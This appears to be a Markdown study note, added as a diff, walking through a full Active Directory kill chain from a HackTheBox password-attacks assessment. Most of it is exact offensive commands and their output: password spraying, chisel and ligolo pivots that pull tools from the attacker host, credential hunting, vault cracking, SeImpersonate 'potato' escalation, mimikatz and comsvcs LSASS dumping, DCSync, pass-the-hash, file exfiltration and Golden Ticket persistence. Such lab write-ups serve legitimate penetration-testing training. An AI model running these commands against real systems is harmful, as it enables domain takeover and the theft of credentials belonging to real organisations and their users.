@@ -1,0 +1,346 @@
+---
+title: "AD Attack Path — Worked Example (Password Attacks Skills Assessment)"
+---
+
+> A **full kill‑chain walkthrough** built from the real assessment we did against `nexura.htb` (DMZ → internal AD → Domain Controller). Every step has the **idea**, the **tools**, the **exact commands**, and the **errors/caveats** that actually bit us. Use it as a template — the *order of operations* matters more than any single command.
+
+<Warning>
+**⚠️ Verify flags before relying on these mid‑assessment**
+
+Most commands here were run during the actual engagement, but **tool flags drift between versions** — this very box hit `xfreerdp` vs `xfreerdp3`, `bloodyAD add dsync` vs `add dcsync`, and `docker compose` vs `docker-compose`. Treat each command as a **strong starting point**: confirm syntax with `-h`/`--help` the first time on a new box, and **correct this note as you go** so it becomes your verified source of truth.
+</Warning>
+
+---
+
+## ⏱️ HOW TO USE THIS — decision header ("if you have X, do Y")
+
+| You currently have… | Do this | Section |
+|---|---|---|
+| A name / company only | OSINT → generate usernames → spray a known password | [1](#1-osint--username-generation) [2](#2-password-spraying) |
+| Creds + only one external host reachable | Foothold it, then **pivot** into the internal subnet | [3](#3-foothold) [4](#4-pivot) |
+| A shell on a Linux host | Hunt creds: `.bash_history`, configs, shares, keytabs/ccache, `sudo -l` | [5](#5-credential-hunting-linux) |
+| Valid domain creds, no admin | Enumerate: users, shares, **BloodHound**, roasting, password policy | [6](#6-internal-ad-enumeration) |
+| A password vault / encrypted file | Crack it offline (pwsafe2john / office2john → hashcat/john) | [7](#7-cracking-loot) |
+| Local admin on a Windows box | Elevate (UAC / **SeImpersonate→SYSTEM**) → **dump LSASS** | [8](#8-windows-privesc) [9](#9-credential-dumping) |
+| A Domain Admin credential | **DCSync** the Administrator/krbtgt hash → done | [10](#10-domain-compromise) |
+| Need a file off an internal host | `evil-winrm download`, or stage via the DMZ host | [11](#11-file-transfer-over-a-pivot) |
+| Anything "Connection reset / hangs" over VPN | **Lower tun0 MTU to 1200** | [Caveats](#-global-caveats-the-stuff-that-wasted-hours) |
+
+**Golden rule of order on any new host:** *enumerate before you exploit.* On Windows the first three commands are always `whoami /priv`, `whoami /groups`, `whoami /all` — they decide your entire privesc path (see [8](#8-windows-privesc)).
+
+---
+
+## 🗺️ The kill chain (this assessment)
+
+```
+OSINT (Betty Jayde)
+   ↓  namebuster  → username list
+Password spraying (Hydra, SSH)
+   ↓  jbetty : Texas123!@#
+SSH foothold (DMZ01)
+   ↓  chisel / ligolo pivot into 172.16.119.0/24
+Credential discovery (.bash_history)
+   ↓  hwilliam : dealer-screwed-gym1
+SMB share looting (FILE01)
+   ↓  Employee-Passwords_OLD.psafe3
+Crack the vault (pwsafe2john + john)
+   ↓  bdavid, stom (OLD), hwilliam
+BloodHound → bdavid = local admin on JUMP01 ; stom ∈ Domain Admins
+   ↓
+RDP to JUMP01 as bdavid (local admin)
+   ↓  SeImpersonate → SYSTEM  (PrintSpoofer / GodPotato)
+Mimikatz → LSASS → stom's CURRENT password
+   ↓  stom : calves-warp-learning1  (Domain Admin)
+DCSync against DC01
+   ↓  Administrator NTLM + krbtgt
+FULL DOMAIN COMPROMISE
+```
+
+---
+
+## 1. OSINT → username generation
+
+**Idea:** turn a real human name into likely AD usernames (corporate naming conventions: `jdoe`, `john.doe`, `doej`, …).
+
+```bash
+# namebuster (or username-anarchy / namemash.py)
+namebuster "Betty Jayde" > usernames.txt
+# alt:
+/opt/username-anarchy/username-anarchy Betty Jayde > usernames.txt
+```
+
+> The real account turned out to be `jbetty` (firstinitial+last reversed → here `j`+`betty`). Always generate *many* conventions; you don't know the org's scheme.
+
+---
+
+## 2. Password spraying
+
+**Idea:** one known/guessed password, many users — the inverse of brute force, avoids lockout.
+
+```bash
+# SSH spray (Hydra)
+hydra -L usernames.txt -p 'Texas123!@#' <DMZ_IP> ssh
+#   -> [22][ssh] login: jbetty  password: Texas123!@#
+
+# SMB spray once internal (NetExec) — ONE password across users:
+nxc smb <DC> -u usernames.txt -p 'Texas123!@#' --continue-on-success | grep '[+]'
+```
+
+> ⚠️ **Lockout:** check policy first (`nxc smb <DC> -u valid -p valid --pass-pol`). Watch `BadPW` per account; if `Account Lockout Threshold` is low, spray ONE password per reset window. We pushed `stom`'s BadPW to 8 with a careless full matrix — don't.
+
+---
+
+## 3. Foothold
+
+```bash
+sshpass -p 'Texas123!@#' ssh jbetty@<DMZ_IP>
+# or just: ssh jbetty@<DMZ_IP>
+```
+
+> **Respawn gotchas:** after an HTB box reset the **IP changes** and the **SSH host key changes** → `ssh-keygen -R <old-ip>` to clear the stale key. If SSH *connects then hangs in key exchange* → **MTU** (see caveats).
+
+---
+
+## 4. Pivot (DMZ → internal subnet)
+
+The internal hosts (`JUMP01 .7`, `FILE01 .10`, `DC01 .11`) are only reachable **through DMZ01**. Two ways:
+
+### Option A — chisel + proxychains (SOCKS)
+```bash
+# Kali (attacker)
+./chisel server -p 9001 --reverse
+# DMZ01 (pull binary via your http server first)
+wget http://<KALI>:8080/chisel -O /tmp/chisel && chmod +x /tmp/chisel
+/tmp/chisel client <KALI>:9001 R:1080:socks
+# Kali: /etc/proxychains4.conf  ->  socks5 127.0.0.1 1080
+proxychains nxc smb 172.16.119.11 -u user -p pass
+```
+
+### Option B — ligolo‑ng (transparent TUN — best for RDP/GUI tools)
+```bash
+# Kali
+sudo ip tuntap add user kali mode tun ligolo && sudo ip link set ligolo up
+sudo ./proxy -selfcert            # listens :11601
+# DMZ01
+./agent -connect <KALI>:11601 -ignore-cert
+# Kali (in proxy console type `start`, then add the route)
+sudo ip route add 172.16.119.0/24 dev ligolo
+# now tools work WITHOUT proxychains:
+nxc smb 172.16.119.11 -u user -p pass
+xfreerdp3 /v:172.16.119.7 /u:bdavid /p:'...' /cert:ignore
+```
+
+> 🔑 **proxychains can't carry RDP cleanly** (xfreerdp opens extra channels → hangs). For RDP either use **ligolo** (transparent) or an **SSH local forward** of just port 3389:
+> ```bash
+> ssh -L 13389:172.16.119.7:3389 jbetty@&lt;DMZ_IP>     # then RDP to 127.0.0.1:13389 (no proxychains)
+> xfreerdp3 /v:127.0.0.1:13389 /u:bdavid /p:'...' /cert:ignore
+> ```
+> The RDP **client runs on Kali**, not on DMZ01 — the tunnel brings the internal host to you.
+
+---
+
+## 5. Credential hunting (Linux)
+
+Run on the Linux foothold (DMZ01). Manual hunting beats LaZagne/mimipenguin on a headless server.
+
+```bash
+sudo -l                                               # #1 — instant win if misconfigured
+cat ~/.bash_history; cat /home/*/.bash_history 2>/dev/null
+history | grep -iE "ssh|mysql|psql|password|sshpass|curl|wget"
+ls -la ~/.ssh /home/*/.ssh 2>/dev/null                # keys to pivot with
+grep -riI "pass\|secret\|cred" /etc /opt /var/www /home 2>/dev/null | grep -v Binary
+# Kerberos artifacts (domain-joined Linux) -> Pass-the-Ticket:
+find / -name '*.keytab' 2>/dev/null; ls -la /etc/krb5.keytab 2>/dev/null
+ls -la /tmp/krb5cc_* 2>/dev/null; env | grep KRB5
+```
+
+> Here `.bash_history` held `sshpass -p "dealer-screwed-gym1" ssh hwilliam@file01` → internal cred `hwilliam`. Someone tried to wipe history (`echo > .bash_history`) but an older copy survived.
+> **LaZagne/mimipenguin** target *desktop/keyring* memory and need root — usually useless on a server. Don't burn time on them here.
+
+---
+
+## 6. Internal AD enumeration
+
+```bash
+# valid? local admin anywhere? (look for (Pwn3d!))
+proxychains nxc smb 172.16.119.10 172.16.119.11 172.16.119.7 -u hwilliam -p 'dealer-screwed-gym1'
+# users / shares / policy
+proxychains nxc smb 172.16.119.11 -u bdavid -p '...' --users | tee users.txt
+proxychains nxc smb 172.16.119.10 -u bdavid -p '...' --shares
+proxychains nxc smb 172.16.119.10 -u bdavid -p '...' -M spider_plus     # file inventory -> ~/.nxc/.../<ip>.json
+proxychains nxc smb 172.16.119.11 -u bdavid -p '...' --pass-pol
+# roasting (Password Attacks bread-and-butter)
+proxychains nxc ldap 172.16.119.11 -u bdavid -p '...' --kerberoasting kerb.txt
+proxychains nxc ldap 172.16.119.11 -u bdavid -p '...' --asreproast asrep.txt
+# SYSVOL GPP passwords
+proxychains nxc smb 172.16.119.11 -u bdavid -p '...' -M gpp_password
+# BloodHound (see the dedicated BloodHound cheatsheet)
+proxychains bloodhound-python -u bdavid -p '...' -d nexura.htb -ns 172.16.119.11 -c All --zip --dns-tcp
+# fast ACL check without the GUI:
+proxychains bloodyAD --host 172.16.119.11 -d nexura.htb -u bdavid -p '...' get writable
+```
+
+> **Reading BloodHound:** *inbound* edges to your user (admins → you) are normal and useless. You want **outbound** control *from your owned users*. Mark bdavid/hwilliam **Owned**, run **Shortest Path from Owned Principals → Domain Admins**. Here it revealed: **stom is a direct member of Domain Admins**, and **bdavid is local admin on JUMP01** — the two facts that cracked the box.
+
+---
+
+## 7. Cracking loot
+
+The `HR` share held `Employee-Passwords_OLD.psafe3` (a **Password Safe v3** vault).
+
+```bash
+# download just the file (nxc is reliable through the pivot):
+proxychains nxc smb 172.16.119.10 -u bdavid -p '...' --share HR --get-file 'Archive\Employee-Passwords_OLD.psafe3' ~/loot/emp.psafe3
+# crack the master password:
+pwsafe2john ~/loot/emp.psafe3 > psafe.hash
+john --format=pwsafe --wordlist=/usr/share/wordlists/rockyou.txt psafe.hash
+#   (hashcat alt: hashcat -m 5200 ~/loot/emp.psafe3 rockyou.txt)
+# open it:
+passwordsafe ~/loot/emp.psafe3      # sudo apt install -y passwordsafe
+```
+
+Other vault/file crackers worth knowing:
+
+| File | john helper | hashcat mode |
+|---|---|---|
+| `.psafe3` (Password Safe) | `pwsafe2john` | 5200 |
+| `.kdbx` (KeePass) | `keepass2john` | 13400 |
+| Office `.xlsx/.docx` | `office2john` | 9400/9500/9600 |
+| `.zip` | `zip2john` | 13600 |
+| `.pdf` | `pdf2john` | 10500 |
+| SSH `id_rsa` | `ssh2john` | 22921 |
+
+> ⚠️ The vault was named `_OLD`. `bdavid`/`hwilliam` old passwords still worked, but **`stom`'s was rotated** — the OLD `fails-nibble-disturb4` failed. Stale loot ≠ current creds. (We later got stom's *current* password from LSASS, [9](#9-credential-dumping).)
+> Decoy alert: `Online passwords.xlsx` was filler data (random names). Always check **all sheet tabs** before trusting a file.
+
+---
+
+## 8. Windows privesc
+
+> **FIRST THREE COMMANDS on any Windows shell — always:**
+> ```cmd
+> whoami /priv      :: privileges -> SeImpersonate/SeDebug/SeBackup = escalation paths
+> whoami /groups    :: BUILTIN\Administrators? privileged AD groups?
+> whoami /all       :: full token (SID, integrity level)
+> ```
+> Then: `net user`, `net localgroup administrators`, `systeminfo`, `ipconfig /all`, `netstat -ano`.
+
+bdavid was `BUILTIN\Administrators` on JUMP01 **with `SeImpersonatePrivilege` + `SeDebugPrivilege`**. Two ways to elevate:
+
+### A. You're admin but UAC‑filtered (medium integrity)
+Symptom: `mimikatz # privilege::debug` → `ERROR ... RtlAdjustPrivilege (20) c0000061` (`STATUS_PRIVILEGE_NOT_HELD`). Your token *has* SeDebug but it's stripped by UAC.
+**Fix:** run an **elevated** shell — in the RDP GUI, right‑click cmd/PowerShell → **Run as administrator**. Then `privilege::debug` works.
+
+### B. Abuse `SeImpersonatePrivilege` → SYSTEM (no UAC needed) — the clean HTB move
+```cmd
+.\PrintSpoofer64.exe -i -c cmd.exe
+:: or, very reliable on Server 2019:
+.\GodPotato-NET4.exe -cmd "cmd /c whoami"     :: -> nt authority\system
+```
+Other potatoes: `JuicyPotatoNG`, `RoguePotato`, `EfsPotato`. If you have **SeImpersonate** or **SeAssignPrimaryToken**, a potato gives SYSTEM.
+
+> Quick privesc enumeration: run **winPEAS** (`winPEASx64.exe`) — it flags SeImpersonate, unquoted service paths, AutoLogon creds, etc.
+
+---
+
+## 9. Credential dumping
+
+Once **elevated/SYSTEM**, dump secrets. A **jump host** almost always has a Domain Admin's session in LSASS.
+
+```cmd
+:: mimikatz
+mimikatz.exe
+privilege::debug
+sekurlsa::logonpasswords        :: plaintext + NTLM from LSASS  <- stom's DA creds here
+sekurlsa::ekeys                 :: Kerberos keys
+lsadump::sam                    :: local SAM hashes
+lsadump::secrets                :: LSA secrets (service account passwords)
+lsadump::cachedump              :: cached domain logons
+```
+
+Alternatives:
+```cmd
+:: nanodump / comsvcs to dump lsass.dmp, then parse offline on Kali:
+rundll32 C:\Windows\System32\comsvcs.dll, MiniDump <lsass_PID> C:\Windows\Temp\lss.dmp full
+:: then on Kali:  pypykatz lsa minidump lss.dmp
+LaZagne.exe all                 :: stored app/browser/wifi creds (use the .EXE, no Python needed)
+```
+
+> **LaZagne on Windows with no Python:** download the **standalone `LaZagne.exe`** (PyInstaller build from the releases page) — it bundles Python + deps. Bring it over via `\\tsclient\` (RDP drive redirect) or the DMZ http server, then `LaZagne.exe all`.
+> Result here: `sekurlsa::logonpasswords` revealed **stom : calves‑warp‑learning1** (current DA password) — the key that opened the DC.
+
+---
+
+## 10. Domain compromise (DCSync)
+
+With a Domain Admin credential, pull hashes over the network — **no need to touch NTDS.dit**.
+
+```bash
+# Q1 — the Administrator NTLM hash
+proxychains impacket-secretsdump 'nexura.htb/stom:calves-warp-learning1'@172.16.119.11 -just-dc-user Administrator
+#   -> Administrator:500:aad3b435b51404eeaad3b435b51404ee:<NTHASH>:::
+
+# full domain (krbtgt = Golden Ticket persistence, + every account)
+proxychains impacket-secretsdump 'nexura.htb/stom:calves-warp-learning1'@172.16.119.11
+proxychains nxc smb 172.16.119.11 -u stom -p 'calves-warp-learning1' --ntds
+
+# command execution on the DC (the objective)
+proxychains evil-winrm -i 172.16.119.11 -u stom -p 'calves-warp-learning1'
+# or Pass-the-Hash as Administrator:
+proxychains evil-winrm -i 172.16.119.11 -u Administrator -H <NTHASH>
+```
+
+> If you *do* have NTDS.dit + SYSTEM hive (e.g. via `ntdsutil`/VSS), parse offline:
+> `impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL`
+
+---
+
+## 11. File transfer over a pivot
+
+**Reachability rule:** the pivot is **one‑way** (Kali → internal). Internal hosts **cannot** reach your external Kali IP — so `net use \\<KALI>\share` from the DC fails with **`System error 53`**, and `proxychains impacket-smbserver` does NOT help (proxychains only proxies *outbound clients*, not a *listening server*).
+
+**Pull a file FROM the target TO Kali** (you initiate → works through the session):
+```
+*Evil-WinRM* PS> download C:\NTDS\NTDS.dit /home/kali/loot/ntds.dit    # built into evil-winrm
+*Evil-WinRM* PS> upload /home/kali/tools/PrintSpoofer64.exe            # the reverse
+```
+
+**RDP drive redirect** (no HTTP at all):
+```bash
+xfreerdp3 /v:127.0.0.1:13389 /u:bdavid /p:'...' /cert:ignore /drive:kali,/home/kali/loot
+#   inside Windows:  copy \\tsclient\kali\Windows\LaZagne.exe C:\Users\Public\
+```
+
+**Stage through the DMZ host** (which internal hosts CAN reach):
+```bash
+# run the SMB/HTTP server on DMZ01 (172.16.119.13), not Kali; then from the internal host:
+net use \\172.16.119.13\share /user:grcan grcan123
+copy C:\loot.zip \\172.16.119.13\share\
+# then pull DMZ01 -> Kali over SSH:  scp jbetty@<DMZ>:/path/loot.zip ~/loot/
+```
+
+---
+
+## 🚨 GLOBAL CAVEATS (the stuff that wasted hours)
+
+| Symptom | Real cause | Fix |
+|---|---|---|
+| SSH/PKINIT/LDAPS **connects then hangs**, or "Connection reset by peer", while ping/`nc -z` work | **VPN MTU** — large packets fragment & drop; small ones pass | `sudo ip link set dev tun0 mtu 1200` |
+| `ssh` hangs after spawn, no error | New host key after respawn, OR MTU | `ssh-keygen -R <ip>`; lower MTU |
+| RDP over proxychains hangs / cancels | SOCKS can't carry RDP's channels | ligolo, or `ssh -L 13389:host:3389` then RDP to localhost |
+| `xfreerdp` "command not found" on the *target* | It runs on **Kali**, not the pivot host | `apt install freerdp3-x11`; run on Kali against the forwarded port |
+| `mimikatz privilege::debug` → `c0000061` | Not elevated (UAC medium integrity) | Run as admin, or SeImpersonate→SYSTEM |
+| `net use \\KALI\..` → `System error 53` | Internal host can't reach your external IP | `evil-winrm download`; or stage via DMZ host |
+| `nxc`/`smbclient` `STATUS_LOGON_FAILURE` but creds are "right" | Stale/OLD password, or wrong workgroup in smbclient | use current creds; smbclient needs `-W <domain>` |
+| `impacket-secretsdump: No module named 'pkg_resources'` | Running inside a venv missing setuptools | `deactivate` (use system impacket) or `pip install setuptools` |
+| `evil-winrm: OPENSSL_init_ssl (RuntimeError)` | Broken `/etc/ssl/openssl.cnf` (typo'd section, e.g. `deck` vs `sect`) | revert openssl.cnf; quick bypass `OPENSSL_CONF=/dev/null evil-winrm ...` |
+| Stale `KRB5CCNAME` from a previous box | Old ccache auto‑loaded | `unset KRB5CCNAME` |
+| Account won't authenticate, `BadPW` climbing | You're **locking it out** with spraying | check `--pass-pol`; wait the reset window; spray slower |
+
+---
+
+## 🧠 Methodology distilled (memorize this loop)
+
+1. **Foothold** → 2. **Enumerate the host** (Linux: history/configs/sudo/keytabs · Windows: `whoami /priv|/groups`) → 3. **Pivot** if internal → 4. **Enumerate AD** (nxc users/shares/policy + BloodHound) → 5. **Loot & crack** (shares, vaults) → 6. **Escalate** (SeImpersonate→SYSTEM, dump LSASS) → 7. **Find the privileged credential** (BloodHound path member / DA in LSASS) → 8. **DCSync** → 9. **Persist** (krbtgt = Golden Ticket).
+
+> The recurring theme of this box: **passwords, not exploits.** Every hop was a credential — sprayed, found in history, cracked from a vault, or dumped from memory. When stuck, ask "where would a credential be hiding?" not "what CVE applies?"
